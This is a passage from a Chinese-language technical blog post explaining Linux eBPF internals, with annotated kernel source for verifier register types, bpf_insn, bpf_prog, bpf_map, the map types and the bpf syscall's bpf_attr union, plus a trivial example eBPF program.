</span><span style="color:#65737e;"> * if (range &gt; 0) then [ptr, ptr + range - off) is safe to access
</span><span style="color:#65737e;"> * if (id &gt; 0) means that some &#39;var&#39; was added
</span><span style="color:#65737e;"> * if (off &gt; 0) means that &#39;imm&#39; was added
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">enum </span><span style="color:#c0c5ce;">bpf_reg_type {
</span><span style="color:#c0c5ce;">	NOT_INIT = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,		 </span><span style="color:#65737e;">/* nothing was written into register */
</span><span style="color:#c0c5ce;">	SCALAR_VALUE,		 </span><span style="color:#65737e;">/* reg doesn&#39;t contain a valid pointer */
</span><span style="color:#c0c5ce;">	PTR_TO_CTX,		 </span><span style="color:#65737e;">/* reg points to bpf_context */
</span><span style="color:#c0c5ce;">	CONST_PTR_TO_MAP,	 </span><span style="color:#65737e;">/* reg points to struct bpf_map */
</span><span style="color:#c0c5ce;">	PTR_TO_MAP_VALUE,	 </span><span style="color:#65737e;">/* reg points to map element value */
</span><span style="color:#c0c5ce;">	PTR_TO_MAP_KEY,		 </span><span style="color:#65737e;">/* reg points to a map element key */
</span><span style="color:#c0c5ce;">	PTR_TO_STACK,		 </span><span style="color:#65737e;">/* reg == frame_pointer + offset */
</span><span style="color:#c0c5ce;">	PTR_TO_PACKET_META,	 </span><span style="color:#65737e;">/* skb-&gt;data - meta_len */
</span><span style="color:#c0c5ce;">	PTR_TO_PACKET,		 </span><span style="color:#65737e;">/* reg points to skb-&gt;data */
</span><span style="color:#c0c5ce;">	PTR_TO_PACKET_END,	 </span><span style="color:#65737e;">/* skb-&gt;data + headlen */
</span><span style="color:#c0c5ce;">	PTR_TO_FLOW_KEYS,	 </span><span style="color:#65737e;">/* reg points to bpf_flow_keys */
</span><span style="color:#c0c5ce;">	PTR_TO_SOCKET,		 </span><span style="color:#65737e;">/* reg points to struct bpf_sock */
</span><span style="color:#c0c5ce;">	PTR_TO_SOCK_COMMON,	 </span><span style="color:#65737e;">/* reg points to sock_common */
</span><span style="color:#c0c5ce;">	PTR_TO_TCP_SOCK,	 </span><span style="color:#65737e;">/* reg points to struct tcp_sock */
</span><span style="color:#c0c5ce;">	PTR_TO_TP_BUFFER,	 </span><span style="color:#65737e;">/* reg points to a writable raw tp&#39;s buffer */
</span><span style="color:#c0c5ce;">	PTR_TO_XDP_SOCK,	 </span><span style="color:#65737e;">/* reg points to struct xdp_sock */
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* PTR_TO_BTF_ID points to a kernel struct that does not need
</span><span style="color:#65737e;">	 * to be null checked by the BPF program. This does not imply the
</span><span style="color:#65737e;">	 * pointer is _not_ null and in practice this can easily be a null
</span><span style="color:#65737e;">	 * pointer when reading pointer chains. The assumption is program
</span><span style="color:#65737e;">	 * context will handle null pointer dereference typically via fault
</span><span style="color:#65737e;">	 * handling. The verifier must keep this in mind and can make no
</span><span style="color:#65737e;">	 * assumptions about null or non-null when doing branch analysis.
</span><span style="color:#65737e;">	 * Further, when passed into helpers the helpers can not, without
</span><span style="color:#65737e;">	 * additional context, assume the value is non-null.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	PTR_TO_BTF_ID,
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* PTR_TO_BTF_ID_OR_NULL points to a kernel struct that has not
</span><span style="color:#65737e;">	 * been checked for null. Used primarily to inform the verifier
</span><span style="color:#65737e;">	 * an explicit null check is required for this struct.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	PTR_TO_MEM,		 </span><span style="color:#65737e;">/* reg points to valid memory region */
</span><span style="color:#c0c5ce;">	PTR_TO_ARENA,
</span><span style="color:#c0c5ce;">	PTR_TO_BUF,		 </span><span style="color:#65737e;">/* reg points to a read/write buffer */
</span><span style="color:#c0c5ce;">	PTR_TO_FUNC,		 </span><span style="color:#65737e;">/* reg points to a bpf program function */
</span><span style="color:#c0c5ce;">	CONST_PTR_TO_DYNPTR,	 </span><span style="color:#65737e;">/* reg points to a const struct bpf_dynptr */
</span><span style="color:#c0c5ce;">	__BPF_REG_TYPE_MAX,
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Extended reg_types. */
</span><span style="color:#c0c5ce;">	PTR_TO_MAP_VALUE_OR_NULL	= PTR_MAYBE_NULL | PTR_TO_MAP_VALUE,
</span><span style="color:#c0c5ce;">	PTR_TO_SOCKET_OR_NULL		= PTR_MAYBE_NULL | PTR_TO_SOCKET,
</span><span style="color:#c0c5ce;">	PTR_TO_SOCK_COMMON_OR_NULL	= PTR_MAYBE_NULL | PTR_TO_SOCK_COMMON,
</span><span style="color:#c0c5ce;">	PTR_TO_TCP_SOCK_OR_NULL		= PTR_MAYBE_NULL | PTR_TO_TCP_SOCK,
</span><span style="color:#c0c5ce;">	PTR_TO_BTF_ID_OR_NULL		= PTR_MAYBE_NULL | PTR_TO_BTF_ID,
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* This must be the last entry. Its purpose is to ensure the enum is
</span><span style="color:#65737e;">	 * wide enough to hold the higher bits reserved for bpf_type_flag.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	__BPF_REG_TYPE_LIMIT	= BPF_TYPE_LIMIT,
</span><span style="color:#c0c5ce;">};
</span></pre>
<h3 id="ebpfzhi-ling-yu-ebpfcheng-xu">eBPF指令与eBPF程序</h3><p>RISC指令集，单条eBPF指令在内核中定义为一个<code>bpf_insn</code>结构体</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* BPF has 10 general purpose 64-bit registers and stack frame. */
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">MAX_BPF_REG	__MAX_BPF_REG
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_insn {
</span><span style="color:#c0c5ce;">	__u8	code;		</span><span style="color:#65737e;">/* opcode */
</span><span style="color:#c0c5ce;">	__u8	dst_reg:</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">;	</span><span style="color:#65737e;">/* dest register */
</span><span style="color:#c0c5ce;">	__u8	src_reg:</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">;	</span><span style="color:#65737e;">/* source register */
</span><span style="color:#c0c5ce;">	__s16	off;		</span><span style="color:#65737e;">/* signed offset */
</span><span style="color:#c0c5ce;">	__s32	imm;		</span><span style="color:#65737e;">/* signed immediate constant */
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>一个最简单的 eBPF 程序便是一个 bpf_insn 结构体数组，我们可以直接在用户态下编写形如这样的结构体数组来描述一个 eBPF 程序，并作为 eBPF 程序字节码传入内核：</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">CODE</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">OFF</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">IMM</span><span style="color:#c0c5ce;">)          \
</span><span style="color:#c0c5ce;">    ((</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn) {                                \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">code        </span><span style="color:#c0c5ce;">= CODE,                            \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">dst_reg     </span><span style="color:#c0c5ce;">= DST,                             \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">src_reg     </span><span style="color:#c0c5ce;">= SRC,                             \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">off         </span><span style="color:#c0c5ce;">= OFF,                             \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">imm         </span><span style="color:#c0c5ce;">= IMM                              \
</span><span style="color:#c0c5ce;">})
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn test_bpf_prog[] = {
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_ALU64 | BPF_MOV | BPF_K, BPF_REG_0, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x114514</span><span style="color:#c0c5ce;">),
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_JMP | BPF_EXIT, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>载入内核后，内核最终使用一个<code>bpf_prog</code>结构体表示一个 eBPF 程序</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_prog {
</span><span style="color:#c0c5ce;">	u16			pages;		</span><span style="color:#65737e;">/* 分配的页面数量 */
</span><span style="color:#c0c5ce;">	u16			jited:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,	</span><span style="color:#65737e;">/* 我们的 filter 是否是即时编译的? */
</span><span style="color:#c0c5ce;">				jit_requested:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,</span><span style="color:#65737e;">/* 架构需要即时编译程序 */
</span><span style="color:#c0c5ce;">				gpl_compatible:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#65737e;">/* filter 是否兼容 GPL? */
</span><span style="color:#c0c5ce;">				cb_access:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,	</span><span style="color:#65737e;">/* 控制块被访问了吗? */
</span><span style="color:#c0c5ce;">				dst_needed:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,	</span><span style="color:#65737e;">/* 我们是否需要 dst 入口? */
</span><span style="color:#c0c5ce;">				blinding_requested:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#65737e;">/* needs constant blinding *///译注：不知道咋翻
</span><span style="color:#c0c5ce;">				blinded:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,	</span><span style="color:#65737e;">/* Was blinded *///译注：瞎了？
</span><span style="color:#c0c5ce;">				is_func:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,	</span><span style="color:#65737e;">/* 程序为一个 bpf 函数 */
</span><span style="color:#c0c5ce;">				kprobe_override:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#65737e;">/* 我们是否在一个 kprobe 之上? */
</span><span style="color:#c0c5ce;">				has_callchain_buf:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#65737e;">/* callchain buffer 分配了吗? */
</span><span style="color:#c0c5ce;">				enforce_expected_attach_type:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#65737e;">/* 在 attach 时强制执行 expected_attach_type 检查 */
</span><span style="color:#c0c5ce;">				call_get_stack:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#65737e;">/* 我们是否调用 bpf_get_stack() 或 bpf_get_stackid() */
</span><span style="color:#c0c5ce;">				call_get_func_ip:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#65737e;">/* 我们是否调用 get_func_ip() */
</span><span style="color:#c0c5ce;">				tstamp_type_access:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">/* 被访问的 __sk_buff-&gt;tstamp_type */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">enum</span><span style="color:#c0c5ce;"> bpf_prog_type	type;		</span><span style="color:#65737e;">/* BPF 程序类型 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">enum</span><span style="color:#c0c5ce;"> bpf_attach_type	expected_attach_type; </span><span style="color:#65737e;">/* 用于一些程序类型 */
</span><span style="color:#c0c5ce;">	u32			len;		</span><span style="color:#65737e;">/* filter 块的数量 */
</span><span style="color:#c0c5ce;">	u32			jited_len;	</span><span style="color:#65737e;">/* 按字节计的被即时编译的指令大小 */
</span><span style="color:#c0c5ce;">	u8			tag[BPF_TAG_SIZE];
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_prog_stats __percpu *stats;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> __percpu		*active;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int		</span><span style="color:#c0c5ce;">(*bpf_func)(</span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*ctx,
</span><span style="color:#c0c5ce;">					    </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_insn *insn);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_prog_aux	*aux;		</span><span style="color:#65737e;">/* 辅助域 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">sock_fprog_kern	*orig_prog;	</span><span style="color:#65737e;">/* 原始 BPF 程序 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* 翻译器的指令 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">union </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">DECLARE_FLEX_ARRAY</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sock_filter, insns);
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">DECLARE_FLEX_ARRAY</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn, insnsi);
</span><span style="color:#c0c5ce;">	};
</span><span style="color:#c0c5ce;">};
</span></pre>
<p><code>bpf_func</code>函数指针即指向 BPF 字节码经过 JIT 编译生成的汇编代码入口</p>
<h3 id="ebpf-map">eBPF map</h3><p>bpf_map 通用的用以存储不同种类数据的结构，用来在用户进程与eBPF程序、eBPF程序与eBPF程序之间进行<strong>数据共享</strong>，用户在创建时只需指定 key 和 value 的size</p>
<p>bpf_map 五个基本属性：</p>
<ul>
<li><code>type</code></li>
<li><code>key_size</code></li>
<li><code>value_size</code></li>
<li><code>max_entries</code></li>
<li><code>map_flags</code></li>
</ul>
<p><code>bpf_map</code>结构体</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_map {
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* 前两条缓存行带有以读取为主的成员，
</span><span style="color:#65737e;">	 * 其中一些也在快速路径中被访问 (e.g. ops, max_entries).
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">const struct </span><span style="color:#c0c5ce;">bpf_map_ops *ops ____cacheline_aligned;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_map *inner_map_meta;
</span><span style="color:#b48ead;">#ifdef</span><span style="color:#c0c5ce;"> CONFIG_SECURITY
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*security;
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">enum</span><span style="color:#c0c5ce;"> bpf_map_type map_type;
</span><span style="color:#c0c5ce;">	u32 key_size;
</span><span style="color:#c0c5ce;">	u32 value_size;
</span><span style="color:#c0c5ce;">	u32 max_entries;
</span><span style="color:#c0c5ce;">	u64 map_extra; </span><span style="color:#65737e;">/* any per-map-type extra fields */
</span><span style="color:#c0c5ce;">	u32 map_flags;
</span><span style="color:#c0c5ce;">	u32 id;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">btf_record *record;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> numa_node;
</span><span style="color:#c0c5ce;">	u32 btf_key_type_id;
</span><span style="color:#c0c5ce;">	u32 btf_value_type_id;
</span><span style="color:#c0c5ce;">	u32 btf_vmlinux_value_type_id;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">btf *btf;
</span><span style="color:#b48ead;">#ifdef</span><span style="color:#c0c5ce;"> CONFIG_MEMCG_KMEM
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">obj_cgroup *objcg;
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> name[BPF_OBJ_NAME_LEN];
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">btf_field_offs *field_offs;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* The 3rd and 4th cacheline with misc members to avoid false sharing
</span><span style="color:#65737e;">	 * particularly with refcounting.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	atomic64_t refcnt ____cacheline_aligned;
</span><span style="color:#c0c5ce;">	atomic64_t usercnt;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> work_struct work;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> mutex freeze_mutex;
</span><span style="color:#c0c5ce;">	atomic64_t writecnt;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* &#39;Ownership&#39; of program-containing map is claimed by the first program
</span><span style="color:#65737e;">	 * that is going to use this map or by the first program which FD is
</span><span style="color:#65737e;">	 * stored in the map to make sure that all callers and callees have the
</span><span style="color:#65737e;">	 * same prog type, JITed flag and xdp_has_frags flag.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		spinlock_t lock;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">enum</span><span style="color:#c0c5ce;"> bpf_prog_type type;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> jited;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> xdp_has_frags;
</span><span style="color:#c0c5ce;">	} owner;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> bypass_spec_v1;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> frozen; </span><span style="color:#65737e;">/* write-once; write-protected by freeze_mutex */
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>可选map类型如下：</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">enum </span><span style="color:#c0c5ce;">bpf_map_type {
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_UNSPEC,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_HASH,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_ARRAY,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_PROG_ARRAY,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_PERF_EVENT_ARRAY,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_PERCPU_HASH,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_PERCPU_ARRAY,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_STACK_TRACE,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_CGROUP_ARRAY,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_LRU_HASH,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_LRU_PERCPU_HASH,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_LPM_TRIE,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_ARRAY_OF_MAPS,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_HASH_OF_MAPS,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_DEVMAP,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_SOCKMAP,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_CPUMAP,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_XSKMAP,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_SOCKHASH,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* BPF_MAP_TYPE_CGROUP_STORAGE is available to bpf programs attaching
</span><span style="color:#65737e;">	 * to a cgroup. The newer BPF_MAP_TYPE_CGRP_STORAGE is available to
</span><span style="color:#65737e;">	 * both cgroup-attached and other progs and supports all functionality
</span><span style="color:#65737e;">	 * provided by BPF_MAP_TYPE_CGROUP_STORAGE. So mark
</span><span style="color:#65737e;">	 * BPF_MAP_TYPE_CGROUP_STORAGE deprecated.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_CGROUP_STORAGE = BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_REUSEPORT_SOCKARRAY,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_QUEUE,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_STACK,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_SK_STORAGE,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_DEVMAP_HASH,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_STRUCT_OPS,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_RINGBUF,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_INODE_STORAGE,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_TASK_STORAGE,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_BLOOM_FILTER,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_USER_RINGBUF,
</span><span style="color:#c0c5ce;">	BPF_MAP_TYPE_CGRP_STORAGE,
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>常用map类型：</p>
<ul>
<li><code>BPF_MAP_TYPE_HASH</code>：以哈希表形式存储键值对，比较常规</li>
<li><code>BPF_MAP_TYPE_ARRAY</code>：以数组形式存储键值对，<strong>key 即为数组下标，对应的 value 皆初始化为 0</strong></li>
<li><code>BPF_MAP_TYPE_PROG_ARRAY</code>：特殊的数组映射，<strong>value 为其他 eBPF 程序的文件描述符</strong></li>
<li><code>BPF_MAP_TYPE_STACK</code>：以栈形式存储数据</li>
</ul>
<h2 id="bpfxi-tong-diao-yong">bpf系统调用</h2><p>普通用户使用eBPF有限制，只有<code>BPF_PROG_TYPE_SOCKET_FILTER</code>和<code>BPF_PROG_TYPE_CGROUP_SKB</code>这两类eBPF程序可以被普通用户load</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">bpf_prog_load</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr *</span><span style="color:#bf616a;">attr</span><span style="color:#c0c5ce;">, bpfptr_t </span><span style="color:#bf616a;">uattr</span><span style="color:#c0c5ce;">, u32 </span><span style="color:#bf616a;">uattr_size</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp;
</span><span style="color:#c0c5ce;">	    type != BPF_PROG_TYPE_CGROUP_SKB &amp;&amp;
</span><span style="color:#c0c5ce;">	    !</span><span style="color:#8fa1b3;">bpf_capable</span><span style="color:#c0c5ce;">())
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EPERM;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>对ePBF所有操作都是通过<code>bpf</code>系统调用来完成的</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr *</span><span style="color:#bf616a;">attr</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">);
</span></pre>
<h3 id="bpf-attrjie-gou-ti">bpf_attr结构体</h3><p>系统调用中第二个参数 指向联合体<code>bpf_attr</code>
看注释就知道 不同命令对应了不同的结构体</p>
<p>更详细的命令解读在注释里
https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L1462</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">union </span><span style="color:#c0c5ce;">bpf_attr {
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* BPF_MAP_CREATE 命令所使用的匿名结构体 */
</span><span style="color:#c0c5ce;">		__u32	map_type;	</span><span style="color:#65737e;">/* one of enum bpf_map_type */
</span><span style="color:#c0c5ce;">		__u32	key_size;	</span><span style="color:#65737e;">/* key 按字节计的大小 */
</span><span style="color:#c0c5ce;">		__u32	value_size;	</span><span style="color:#65737e;">/* value 按字节计的大小 */
</span><span style="color:#c0c5ce;">		__u32	max_entries;	</span><span style="color:#65737e;">/* map 中最大的 entries 数量 */
</span><span style="color:#c0c5ce;">		__u32	map_flags;	</span><span style="color:#65737e;">/* BPF_MAP_CREATE 相关的
</span><span style="color:#65737e;">					 * 在上面定义的 flags.
</span><span style="color:#65737e;">					 */
</span><span style="color:#c0c5ce;">		__u32	inner_map_fd;	</span><span style="color:#65737e;">/* 指向内部 map 的 fd */
</span><span style="color:#c0c5ce;">		__u32	numa_node;	</span><span style="color:#65737e;">/* numa node (仅当设置了
</span><span style="color:#65737e;">					 * BPF_F_NUMA_NODE 时有效).
</span><span style="color:#65737e;">					 */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">	map_name[BPF_OBJ_NAME_LEN];
</span><span style="color:#c0c5ce;">		__u32	map_ifindex;	</span><span style="color:#65737e;">/* ifindex of netdev to create on */
</span><span style="color:#c0c5ce;">		__u32	btf_fd;		</span><span style="color:#65737e;">/* 指向一个 BTF 类型数据的 fd */
</span><span style="color:#c0c5ce;">		__u32	btf_key_type_id;	</span><span style="color:#65737e;">/* BTF type_id of the key */
</span><span style="color:#c0c5ce;">		__u32	btf_value_type_id;	</span><span style="color:#65737e;">/* BTF type_id of the value */
</span><span style="color:#c0c5ce;">		__u32	btf_vmlinux_value_type_id;</span><span style="color:#65737e;">/* BTF type_id of a kernel-
</span><span style="color:#65737e;">						   * struct stored as the
</span><span style="color:#65737e;">						   * map value
</span><span style="color:#65737e;">						   */
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* Any per-map-type extra fields
</span><span style="color:#65737e;">		 *
</span><span style="color:#65737e;">		 * BPF_MAP_TYPE_BLOOM_FILTER - 最低 4 位指示了
</span><span style="color:#65737e;">		 * 哈希函数的数量(若为 0, bloom filter 将默认
</span><span style="color:#65737e;">		 * 使用 5 个哈希函数).
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		__u64	map_extra;
</span><span style="color:#c0c5ce;">	};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* BPF_MAP_*_ELEM 命令所使用的匿名结构体 */
</span><span style="color:#c0c5ce;">		__u32		map_fd;
</span><span style="color:#c0c5ce;">		__aligned_u64	key;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">union </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">			__aligned_u64 value;
</span><span style="color:#c0c5ce;">			__aligned_u64 next_key;
</span><span style="color:#c0c5ce;">		};
</span><span style="color:#c0c5ce;">		__u64		flags;
</span><span style="color:#c0c5ce;">	};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* BPF_MAP_*_BATCH 命令所使用的匿名结构体 */
</span><span style="color:#c0c5ce;">		__aligned_u64	in_batch;	</span><span style="color:#65737e;">/* start batch,
</span><span style="color:#65737e;">						 * NULL to start from beginning
</span><span style="color:#65737e;">						 */
</span><span style="color:#c0c5ce;">		__aligned_u64	out_batch;	</span><span style="color:#65737e;">/* output: next start batch */
